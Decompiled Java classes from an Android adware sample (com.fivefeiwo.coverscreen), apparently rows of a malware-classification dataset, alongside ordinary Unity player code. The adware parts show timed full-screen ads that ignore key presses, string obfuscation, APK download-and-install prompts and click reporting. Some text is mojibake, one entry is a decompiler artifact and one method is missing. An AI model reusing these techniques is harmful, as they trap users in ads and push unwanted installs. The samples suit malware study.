"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\RunnableC0015n.code","final class RunnableC0015n implements Runnable {   private String a;   private H b;   private C0014m c;   public RunnableC0015n(  C0014m c0014m,  String str,  H h){     this.c=c0014m;     this.a=str;     this.b=h;   }   @Override public final void run(){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.a)),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     ae.a(this.c.a.b).a(this.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.a(),this.b.a(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…_feiwocp"".replace(""_feiwocp"",""""),intent,34,this.b.b(),System.currentTimeMillis());   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\RunnableC0027z.code","final class RunnableC0027z implements Runnable {   private C0026y a;   public RunnableC0027z(  C0026y c0026y){     this.a=c0026y;   }   @Override public final void run(){     if (this.a.a.a() == null || this.a.a.a().isEmpty()) {       this.a.a.i();     }  else {       this.a.a.f();     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\S.code","public final class S {   public static final String a=""2.1_feiwocp"".replace(""_feiwocp"","""");   public static final String b=""COVERSCREEN_feiwocp"".replace(""_feiwocp"","""");   public static final String c=""V1_feiwocp"".replace(""_feiwocp"","""");   public static String d=""/adfeiwo/c-cache/image_feiwocp"".replace(""_feiwocp"","""");   public static String e=""/adfeiwo/c-cache/apk_feiwocp"".replace(""_feiwocp"","""");   public static String f;   public static String g;   public static String h;   public static final String i;   public static final String j;   public static final String k;   public static final String l;   public static final String m;   public static final String n;   public static final String o;   public static final String p;   public static final String q;   public static final String r; static {     ""/adfeiwo/c-cache/log_feiwocp"".replace(""_feiwocp"","""");     f=""coverscreen_close2.png_feiwocp"".replace(""_feiwocp"","""");     g=""coverscreen_download2.png_feiwocp"".replace(""_feiwocp"","""");     h=""coverscreen_clickshow2.png_feiwocp"".replace(""_feiwocp"","""");     ""d_feiwocp"".replace(""_feiwocp"","""");     i=""download_confirm_feiwocp"".replace(""_feiwocp"","""");     j=""DP_FEIWO_feiwocp"".replace(""_feiwocp"","""");     k=""appkey_feiwocp"".replace(""_feiwocp"","""");     l=""showatscreenonplatform_feiwocp"".replace(""_feiwocp"","""");     m=""showatscreenonuser_feiwocp"".replace(""_feiwocp"","""");     ""12345678_feiwocp"".replace(""_feiwocp"","""");     n=""dprate_feiwocp"".replace(""_feiwocp"","""");     o=""dpswitchdelay_feiwocp"".replace(""_feiwocp"","""");     p=""dpnum_feiwocp"".replace(""_feiwocp"","""");     q=""broadcast.route.control.close_feiwocp"".replace(""_feiwocp"","""");     r=""broadcast.route.control_feiwocp"".replace(""_feiwocp"","""");   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\SA.code","public final class SA extends Activity {   Context b;   private C0020s c;   private List d;   Handler a=new Handler();   private List e=new ArrayList();   private String f=null;   private BroadcastReceiver g=new C0011j(this);   public static void a(  SA sa){     if (CPManager.getInstance() == null) {       sa.finish();       return;     }     sa.f=CPManager.getInstance().d();     int intExtra=sa.getIntent().getIntExtra(""index_feiwocp"".replace(""_feiwocp"",""""),0);     List list=(List)sa.getIntent().getSerializableExtra(""itemList_feiwocp"".replace(""_feiwocp"",""""));     if (list == null || list.isEmpty()) {       sa.finish();       return;     }     DisplayMetrics displayMetrics=new DisplayMetrics();     sa.getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);     int i=displayMetrics.widthPixels;     int i2=displayMetrics.heightPixels;     ap.a(sa,S.j,S.o,10000);     sa.d=list;     if (sa.d.isEmpty()) {       sa.finish();     }  else {       sa.c=new A(sa,sa.d,intExtra);       sa.setContentView(sa.c,new ViewGroup.LayoutParams(-1,-1));     }   }   public final void a(  Q q){     if (q == null) {       return;     }     new StringBuilder().append(""ç‚¹å‡»ç±»åž‹ï¼š"").append(q.h());     if (P.a(getContext())) {       if (!aq.a(q.e())) {         Intent intent=new Intent(S.r);         intent.putExtra(""type_feiwocp"".replace(""_feiwocp"",""""),1);         intent.putExtra(""packageName_feiwocp"".replace(""_feiwocp"",""""),q.e());         sendBroadcast(intent);       }       JSONObject a=H.a(getContext(),0.0d,0.0d,this.f,0,"""" + q.m(),"""");       ab abVar=new ab();       abVar.a(getContext(),I.a(),this.f,a.toString());       abVar.a(new C0016o(this));       Z.a().a(abVar);       if (Q.a.equals(q.h())) {         if (P.a().a(q.f())) {           Toast.makeText(getApplicationContext(),""å·²åœ¨ä¸‹è½½ä¸­_feiwocp"".replace(""_feiwocp"",""""),0).show();         }  else {           Toast.makeText(getApplicationContext(),""æ­£åœ¨ä¸‹è½½  _feiwocp"".replace(""_feiwocp"","""") + q.d() + "" å�¯åˆ°é€šçŸ¥æ �æŸ¥çœ‹_feiwocp"".replace(""_feiwocp"",""""),0).show();           Y.a();           K.a().a(getContext(),q.k(),Y.a(getContext(),S.d,q.k()),null);           P.a().a(new H(q.a(),q.d(),q.k(),q.e(),q.f()),new C0014m(this,q));         }         if (this.d.isEmpty()) {           finish();           return;         }         return;       }       if (!Q.b.equals(q.h())) {         if (Q.c.equals(q.h())) {           Intent intent2=new Intent(this,(Class<?>)WA.class);           intent2.putExtra(""url_feiwocp"".replace(""_feiwocp"",""""),q.i());           startActivity(intent2);           if (this.d.isEmpty()) {             finish();             return;           }           return;         }         return;       }       new StringBuilder().append(""æ‰“å¼€å¾®ä¿¡å…³æ³¨ï¼š"").append(q.g());       Intent intent3=new Intent();       intent3.setFlags(335544320);       try {         intent3.setClassName(""com.tencent.mm_feiwocp"".replace(""_feiwocp"",""""),""com.tencent.mm.ui.qrcode.GetQRCodeInfoUI_feiwocp"".replace(""_feiwocp"",""""));         intent3.setData(Uri.parse(q.g()));         startActivity(intent3);       }  catch (      ActivityNotFoundException e) {         new StringBuilder().append(""æ‰“å¼€å¾®ä¿¡å…³æ³¨å¤±è´¥ï¼ˆweixinï¼‰ï¼š"").append(e);         intent3.setAction(""android.intent.action.VIEW"");         intent3.setData(Uri.parse(q.g()));         startActivity(intent3);       }       if (this.d.isEmpty()) {         finish();       }     }   }   public final void b(  Q q){     if (q == null || this.e.contains(Integer.valueOf(q.a()))) {       return;     }     this.e.add(Integer.valueOf(q.a()));     JSONObject a=H.a(getContext(),q.m());     ab abVar=new ab();     abVar.a(getContext(),I.b(),this.f,a.toString());     abVar.a(new C0017p(this));     Z.a().a(abVar);   }   public final Context getContext(){     if (this.b == null) {       this.b=getApplicationContext();     }     return this.b;   }   @Override public final void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     getWindow().setBackgroundDrawable(new ColorDrawable(0));     CPManager.close(this);     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     setContentView(frameLayout);     registerReceiver(this.g,new IntentFilter(S.q));     this.a.postDelayed(new RunnableC0012k(this),50L);   }   @Override protected final void onDestroy(){     super.onDestroy();     if (this.g != null) {       unregisterReceiver(this.g);     }   }   @Override public final boolean onKeyDown(  int i,  KeyEvent keyEvent){     new StringBuilder().append(""Ad Activity onKeyDown: "").append(i);     return true;   }   @Override protected final void onNewIntent(  Intent intent){     super.onNewIntent(intent);     this.a.postDelayed(new RunnableC0013l(this),50L);   }   @Override protected final void onResume(){     super.onResume();     if (this.c != null) {       this.c.h();     }   }   @Override protected final void onSaveInstanceState(  Bundle bundle){     super.onSaveInstanceState(bundle);   }   @Override protected final void onStop(){     super.onStop();     if (this.c != null) {       this.c.i();     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\SR.code","!org.eclipse.jdt.core.dom.TypeDeclaration@70c62ecf"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\string.code","public static final class string {   public static final int app_name=0x7f030000; } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\T.code","public class T {   public void a(  H h,  String str,  boolean z){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\U.code","public final class U extends Thread {   Queue a;   H b;   String c;   final P e;   private long f=0;   private long g=0;   private int h=0;   long d=0;   public U(  P p,  H h,  T t){     this.e=p;     this.b=h;     Y.a();     this.c=Y.a(p.d,S.e,h.d());     this.a=new ConcurrentLinkedQueue();     a(t);   }   private void a(  int i){     new StringBuilder().append(""[DownloadCallback] doProgress, progress: "").append(i);     this.e.e.post(new X(this,i));     Iterator it=new ArrayList(this.a).iterator();     while (it.hasNext()) {       it.next();       H h=this.b;       String str=this.c;     }   }   private void a(  boolean z){     new StringBuilder().append(""[DownloadCallback] doComplete, success: "").append(z).append("", url: "").append(this.b.d());     this.e.e.post(new W(this,z));     Iterator it=new ArrayList(this.a).iterator();     while (it.hasNext()) {       ((T)it.next()).a(this.b,this.c,z);     }   }   public final void a(  T t){     if (t != null) {       this.a.add(t);     }   }   @Override public final void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.fivefeiwo.coverscreen.U.run():void"");   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\V.code","final class V implements Runnable {   private U a;   public V(  U u){     this.a=u;   }   @Override public final void run(){     ae.a(this.a.e.d).a(this.a.b.e() + 12345,android.R.drawable.ic_menu_share,this.a.b.a(),this.a.b.a(),""å¼€å§‹ä¸‹è½½ _feiwocp"".replace(""_feiwocp"",""""),new Intent(),18,this.a.b.b(),this.a.d);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ViewOnClickListenerC0021t.code","final class ViewOnClickListenerC0021t implements View.OnClickListener {   private C0020s a;   public ViewOnClickListenerC0021t(  C0020s c0020s){     this.a=c0020s;   }   @Override public final void onClick(  View view){     this.a.e();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\W.code","final class W implements Runnable {   private boolean a;   private U b;   public W(  U u,  boolean z){     this.b=u;     this.a=z;   }   @Override public final void run(){     if (!this.a) {       ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""ä¸‹è½½å¤±è´¥_feiwocp"".replace(""_feiwocp"",""""),new Intent(),16,this.b.b.b(),this.b.d);       return;     }     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.b.c)),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…_feiwocp"".replace(""_feiwocp"",""""),intent,18,this.b.b.b(),this.b.d);     ap.b(this.b.e.d,S.j,this.b.b.c().replace(""."",""""),this.b.b.e() + "","" + new Date().getTime());     try {       ag.a();       ag.a(this.b.e.d,this.b.c);     }  catch (    Exception e) {       Log.e(""D"","""" + e);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\WA.code","public class WA extends Activity {   WebView a;   String b;   boolean c=false;   private TextView d;   private void a(){     this.b=getIntent().getStringExtra(""url_feiwocp"".replace(""_feiwocp"",""""));     if (aq.a(this.b)) {       finish();       return;     }     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     this.a=new WebView(this);     this.a.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     this.a.getSettings().setJavaScriptEnabled(true);     this.a.getSettings().setUseWideViewPort(true);     this.a.getSettings().setCacheMode(0);     this.a.getSettings().setBlockNetworkImage(true);     this.a.getSettings().setSupportZoom(true);     this.a.getSettings().setBuiltInZoomControls(true);     this.a.getSettings().setLightTouchEnabled(true);     this.a.setHorizontalScrollBarEnabled(false);     this.a.setVerticalScrollBarEnabled(false);     this.a.setDownloadListener(new E(this));     this.a.setWebChromeClient(new F(this));     this.a.setWebViewClient(new G(this));     frameLayout.addView(this.a);     this.d=new TextView(this);     this.d.setLayoutParams(new FrameLayout.LayoutParams(-1,-2));     this.d.setPadding(an.a(this,6.0f),an.a(this,6.0f),an.a(this,6.0f),an.a(this,6.0f));     this.d.setBackgroundColor(Color.parseColor(""#66000000_feiwocp"".replace(""_feiwocp"","""")));     this.d.setTextColor(-1);     this.d.setTextSize(16.0f);     frameLayout.addView(this.d);     setContentView(frameLayout);     this.a.loadData(""<h3>Loading...</h3>_placeholder"".replace(""_placeholder"",""""),""text/html"",""UTF-8"");     this.a.loadUrl(""_feiwocp"".replace(""_feiwocp"","""") + this.b);   }   public static void a(  WA wa,  String str){     if (str == null) {       wa.d.setText("""");       wa.d.setVisibility(8);     }  else {       wa.d.setText(str);       wa.d.setVisibility(0);     }   }   @Override public void onBackPressed(){     if (this.c || this.a == null || !this.a.canGoBack()) {       super.onBackPressed();     }  else {       this.a.goBack();     }   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     a();   }   @Override protected void onNewIntent(  Intent intent){     super.onNewIntent(intent);     a();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\X.code","final class X implements Runnable {   private int a;   private U b;   public X(  U u,  int i){     this.b=u;     this.a=i;   }   @Override public final void run(){     ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""å·²ä¸‹è½½ _feiwocp"".replace(""_feiwocp"","""") + this.a + ""%"",new Intent(),18,this.b.b.b(),this.b.d);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\Y.code","public final class Y {   private static Y a;   public static Y a(){     if (a == null) {       a=new Y();     }     return a;   }   public static String a(  Context context,  String str,  String str2){     String stringBuffer;     a();     String substring=str2.substring(str2.lastIndexOf(""/"") + 1,str2.length());     a();     if (!b()) {       StringBuilder sb=new StringBuilder();       a();       StringBuffer stringBuffer2=new StringBuffer();       stringBuffer2.append(context.getFilesDir().getAbsolutePath());       if (!"""".startsWith(""/"") && !context.getFilesDir().getAbsolutePath().endsWith(""/"")) {         stringBuffer2.append(""/"");       }       stringBuffer2.append("""");       File file=new File(stringBuffer2.toString());       if (!file.exists()) {         file.mkdirs();       }       return sb.append(stringBuffer2.toString()).append(substring).toString();     }     StringBuilder sb2=new StringBuilder();     a();     if (b()) {       StringBuffer stringBuffer3=new StringBuffer();       stringBuffer3.append(Environment.getExternalStorageDirectory());       if (!str.startsWith(""/"") && !Environment.getExternalStorageDirectory().toString().endsWith(""/"")) {         stringBuffer3.append(""/"");       }       stringBuffer3.append(str);       File file2=new File(stringBuffer3.toString());       if (!file2.exists()) {         new StringBuilder().append(""åˆ›å»ºæ–‡ä»¶å¤¹: "").append((Object)stringBuffer3).append("", æ˜¯å�¦æˆ�åŠŸï¼š"").append(file2.mkdirs());       }       stringBuffer=stringBuffer3.toString();     }  else {       stringBuffer=null;     }     return sb2.append(stringBuffer).append(""/"").append(substring).toString();   }   private static boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\Z.code","public final class Z {   private static Z a=null;   private ExecutorService b;   private Z(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static Z a(){     if (a == null) {       a=new Z();     }     return a;   }   public final void a(  ab abVar){     this.b.submit(abVar);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\Zsc.code","public class Zsc {   public static void AnzInt(  final Context ctx,  String azkey){     CPManager.init(ctx,azkey);     new Handler().postDelayed(new Runnable(){       @Override public void run(){         CPManager.showAd(ctx);       }     } ,8000L);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\a.code","final class a {   Camera a;   private final Object[] b=new Object[0];   private final int c;   private final int d;   private final int e;   private final int f;   private Camera.Parameters g;   private Camera.Size h;   private int i;   private int[] j;   private c k; public interface InterfaceC0000a {     void onCameraFrame(    a aVar,    byte[] bArr);   }   public a(  int i,  int i2,  int i3,  int i4){     this.c=i;     this.d=a(i2,640);     this.e=a(i3,480);     this.f=a(i4,24);   }   private static final int a(  int i,  int i2){     return i != 0 ? i : i2;   }   private void b(  final InterfaceC0000a interfaceC0000a){     Camera open; synchronized (this.b) {       if (q.b) {         h hVar=q.i;         open=h.c(this.c);       }  else {         open=Camera.open();       }       this.a=open;       this.g=this.a.getParameters();       this.h=f();       this.j=e();       this.i=d();       f fVar=q.g;       f.b(this.g);       if (q.b) {         h hVar2=q.i;         h.b(this.g);       }       this.g.setPreviewSize(this.h.width,this.h.height);       if (q.b) {         h hVar3=q.i;         h.a(this.g,this.j);       }  else {         f fVar2=q.g;         f.a(this.g,this.j);       }       this.a.setParameters(this.g);       Camera.PreviewCallback previewCallback=new Camera.PreviewCallback(){         @Override public final void onPreviewFrame(        byte[] bArr,        Camera camera){           if (a.this.a != camera) {             return;           }           interfaceC0000a.onCameraFrame(a.this,bArr);         }       } ;       if (q.a) {         g gVar=q.h;         g.a(this.a,this.h,this.i,previewCallback);       }  else {         f fVar3=q.g;         f.a(this.a,previewCallback);       }     }   }   private final int d(){     this.g.setPreviewFormat(17);     if (q.a) {       g gVar=q.h;       return g.a(17);     }     f fVar=q.g;     return f.a(17);   }   private final int[] e(){     List<int[]> a;     double d;     int[] iArr;     double d2=this.f * 1000;     if (q.b) {       h hVar=q.i;       a=h.a(this.g);     }  else {       f fVar=q.g;       a=f.a(this.g);     }     int[] iArr2={this.f * 1000,this.f * 1000};     double d3=Double.MAX_VALUE;     for (    int[] iArr3 : a) {       double abs=Math.abs(Math.log(d2 / iArr3[0])) + Math.abs(Math.log(d2 / iArr3[1]));       if (abs < d3) {         iArr=iArr3;         d=abs;       }  else {         d=d3;         iArr=iArr2;       }       iArr2=iArr;       d3=d;     }     return iArr2;   }   private final Camera.Size f(){     double d;     Camera.Size size;     double d2=this.d;     double d3=this.e;     Camera.Size size2=null;     double d4=Double.MAX_VALUE;     for (    Camera.Size size3 : this.g.getSupportedPreviewSizes()) {       double abs=Math.abs(Math.log(d2 / size3.width)) + Math.abs(Math.log(d3 / size3.height));       if (abs < d4) {         size=size3;         d=abs;       }  else {         d=d4;         size=size2;       }       d4=d;       size2=size;     }     return size2;   }   public final int a(){     return this.c;   }   public final void a(  InterfaceC0000a interfaceC0000a){ synchronized (this.b) {       if (this.a == null) {         b(interfaceC0000a);       }       if (this.k == null) {         this.k=new c(){           private Camera a; {             this.a=a.this.a;           }           @Override public final void surfaceCreated(          SurfaceHolder surfaceHolder){ synchronized (a.this.b) {               if (a.this.a != this.a) {                 return;               }               try {                 a.this.a.setPreviewDisplay(surfaceHolder);                 a.this.a.startPreview();               }  catch (              Exception e) {                 n.Log(6,""Unable to initialize webcam data stream: "" + e.getMessage());               }             }           }           @Override public final void surfaceDestroyed(          SurfaceHolder surfaceHolder){ synchronized (a.this.b) {               if (a.this.a != this.a) {                 return;               }               a.this.a.stopPreview();             }           }         } ;         this.k.a();       }     }   }   public final void a(  byte[] bArr){ synchronized (this.b) {       if (this.a != null && q.a) {         g gVar=q.h;         g.a(this.a,bArr);       }     }   }   public final Camera.Size b(){     return this.h;   }   public final void c(){ synchronized (this.b) {       if (this.a != null) {         if (q.a) {           g gVar=q.h;           g.a(this.a);         }  else {           f fVar=q.g;           f.a(this.a);         }         this.a.stopPreview();         this.a.release();         this.a=null;       }       if (this.k != null) {         this.k.b();         this.k=null;       }     }   } } public static class a {   final int a;   final float[] b;   public a(  int i,  float[] fArr){     this.a=i;     this.b=fArr;   } } static class a implements GLSurfaceView.EGLContextFactory {   private a(){   }   a(  byte b){     this();   }   @Override public final EGLContext createContext(  EGL10 egl10,  EGLDisplay eGLDisplay,  EGLConfig eGLConfig){     x.b(""Creating OpenGL ES "" + (x.b ? ""2.0"" : ""1.x"") + "" context (""+ new v(egl10,eGLDisplay,eGLConfig).a()+ "")"");     x.b(""Before eglCreateContext"",egl10);     int[] iArr=new int[3];     iArr[0]=12440;     iArr[1]=x.b ? 2 : 1;     iArr[2]=12344;     EGLContext eglCreateContext=egl10.eglCreateContext(eGLDisplay,eGLConfig,EGL10.EGL_NO_CONTEXT,iArr);     x.b(""After eglCreateContext"",egl10);     return eglCreateContext;   }   @Override public final void destroyContext(  EGL10 egl10,  EGLDisplay eGLDisplay,  EGLContext eGLContext){     egl10.eglDestroyContext(eGLDisplay,eGLContext);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\b.code","final class b {   private int a;   private String b;   private int c;   public b(){     this.a=0;     this.c=0;     Map a=a(""/proc/cpuinfo"");     String str=(String)a.get(""CPU architecture"");     String str2=(String)a.get(""Features"");     if (str != null) {       int length=str.length();       int i=0;       while (i < length && Character.isDigit(str.charAt(i))) {         i++;       }       String substring=str.substring(0,i);       if (Build.CPU_ABI.toLowerCase().startsWith(""arm"")) {         this.a|=2;         if (Integer.decode(substring).intValue() >= 7 && !Build.CPU_ABI.equalsIgnoreCase(""armeabi"")) {           this.a|=16;         }         if (Integer.decode(substring).intValue() >= 6) {           this.a|=8;         }         if (Integer.decode(substring).intValue() >= 5) {           this.a|=4;         }       }     }     if (str2 != null) {       if (str2.contains(""vfpv3"")) {         this.a|=32;       }       if (str2.contains(""neon"")) {         this.a|=64;       }       if (str2.contains(""vfp"")) {         this.a|=128;       }     }     if (Build.CPU_ABI.equalsIgnoreCase(""x86"")) {       this.a=1;     }     if (this.a == 1) {       this.b=(String)a.get(""model name"");     }  else {       this.b=(String)a.get(""Processor"");     }     if (this.b == null) {       this.b=""<unknown>"";     }     this.c=b((String)a(""/proc/meminfo"").get(""MemTotal""));   }   private static Map a(  String str){     HashMap hashMap=new HashMap();     try {       LineNumberReader lineNumberReader=new LineNumberReader(new FileReader(str),8192);       for (String readLine=lineNumberReader.readLine(); readLine != null; readLine=lineNumberReader.readLine()) {         int indexOf=readLine.indexOf(58);         if (indexOf >= 0) {           hashMap.put(readLine.substring(0,indexOf).trim(),readLine.substring(indexOf + 1).trim());         }       }     }  catch (    FileNotFoundException e) {       Log.e(""FileNotFoundException"",e.toString());     } catch (    IOException e2) {       Log.e(""IOException"",e2.toString());     }     return hashMap;   }   private static int b(  String str){     int length=str.length();     int i=0;     while (i < length && Character.isDigit(str.charAt(i))) {       i++;     }     return Integer.decode(str.substring(0,i)).intValue();   }   public final int a(){     return this.a;   }   public final String b(){     return this.b;   }   public final int c(){     return this.c / 1024;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\c.code","abstract class c implements SurfaceHolder.Callback {   private final Activity a=(Activity)u.a.a();   private final int b=3;   private SurfaceView c;   public c(  int i){   }   public final void a(){     this.a.runOnUiThread(new Runnable(){       @Override public final void run(){         if (c.this.c == null) {           c.this.c=new SurfaceView(u.a.a());           c.this.c.getHolder().setType(c.this.b);           c.this.c.getHolder().addCallback(c.this);           u.a.b(c.this.c);           c.this.c.setVisibility(0);         }       }     } );   }   public final void b(){     this.a.runOnUiThread(new Runnable(){       @Override public final void run(){         if (c.this.c != null) {           u.a.c(c.this.c);         }         c.this.c=null;       }     } );   }   @Override public void surfaceChanged(  SurfaceHolder surfaceHolder,  int i,  int i2,  int i3){   }   @Override public void surfaceDestroyed(  SurfaceHolder surfaceHolder){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\d.code","final class d {   final int a;   final int[] b;   public d(  int i,  int[] iArr){     this.a=i;     this.b=iArr;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\e.code","public final class e implements j {   private static int a;   @Override public final void a(  GLSurfaceView gLSurfaceView,  boolean z){     gLSurfaceView.setPreserveEGLContextOnPause(z);   }   @Override public final void a(  final View view){     a=view.getSystemUiVisibility();     view.setOnSystemUiVisibilityChangeListener(new View.OnSystemUiVisibilityChangeListener(){       @Override public final void onSystemUiVisibilityChange(      final int i){         int i2=e.a ^ i;         int unused=e.a=i;         if ((i2 & 1) == 0 || (i & 1) != 0) {           return;         }         view.getHandler().postDelayed(new Runnable(){           @Override public final void run(){             view.setSystemUiVisibility(i | 1);           }         } ,1000L);       }     } );   }   @Override public final void a(  View view,  boolean z){     if (z) {       a|=1;     }  else {       a&=-2;     }     view.setSystemUiVisibility(a);   }   @Override public final boolean a(  Vibrator vibrator){     return vibrator.hasVibrator();   }   @Override public final boolean b(  View view){     return (view.getSystemUiVisibility() & 1) != 0;   }   @Override public final void c(  final View view){     if (b(view)) {       a(view,false);       view.getHandler().postDelayed(new Runnable(){         @Override public final void run(){           e.this.a(view,true);         }       } ,500L);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\f.code","public final class f {   public static int a(  int i){     return 12;   }   public static List a(  Camera.Parameters parameters){     ArrayList arrayList=new ArrayList();     List<Integer> supportedPreviewFrameRates=parameters.getSupportedPreviewFrameRates();     if (supportedPreviewFrameRates != null) {       Iterator<Integer> it=supportedPreviewFrameRates.iterator();       while (it.hasNext()) {         int intValue=it.next().intValue();         arrayList.add(new int[]{intValue * 1000,intValue * 1000});       }     }     return arrayList;   }   public static void a(  Camera.Parameters parameters,  int[] iArr){     parameters.setPreviewFrameRate(iArr[0] / 1000);   }   public static void a(  Camera camera){     camera.setPreviewCallback(null);   }   public static void a(  Camera camera,  Camera.PreviewCallback previewCallback){     camera.setPreviewCallback(previewCallback);   }   public static void b(  Camera.Parameters parameters){     if (parameters.getSupportedColorEffects() != null) {       parameters.setColorEffect(""none"");     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\g.code","public final class g {   public static int a(  int i){     return ImageFormat.getBitsPerPixel(17);   }   public static void a(  Camera camera){     camera.setPreviewCallbackWithBuffer(null);   }   public static void a(  Camera camera,  Camera.Size size,  int i,  Camera.PreviewCallback previewCallback){     int i2=(((size.width * size.height) * i) / 8) + 4096;     camera.addCallbackBuffer(new byte[i2]);     camera.addCallbackBuffer(new byte[i2]);     camera.setPreviewCallbackWithBuffer(previewCallback);   }   public static void a(  Camera camera,  byte[] bArr){     camera.addCallbackBuffer(bArr);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\h.code","public final class h {   public static int a(){     return Camera.getNumberOfCameras();   }   public static int a(  MotionEvent motionEvent){     return motionEvent.getSource();   }   public static List a(  Camera.Parameters parameters){     List<int[]> supportedPreviewFpsRange=parameters.getSupportedPreviewFpsRange();     return supportedPreviewFpsRange != null ? supportedPreviewFpsRange : new ArrayList();   }   public static void a(  Camera.Parameters parameters,  int[] iArr){     parameters.setPreviewFpsRange(iArr[0],iArr[1]);   }   public static boolean a(  int i){     Camera.CameraInfo cameraInfo=new Camera.CameraInfo();     Camera.getCameraInfo(i,cameraInfo);     return cameraInfo.facing == 1;   }   public static int b(  int i){     Camera.CameraInfo cameraInfo=new Camera.CameraInfo();     Camera.getCameraInfo(i,cameraInfo);     return cameraInfo.orientation;   }   public static void b(  Camera.Parameters parameters){     if (parameters.getSupportedFocusModes().contains(""continuous-video"")) {       parameters.setFocusMode(""continuous-video"");     }   }   public static Camera c(  int i){     return Camera.open(i);   } } "
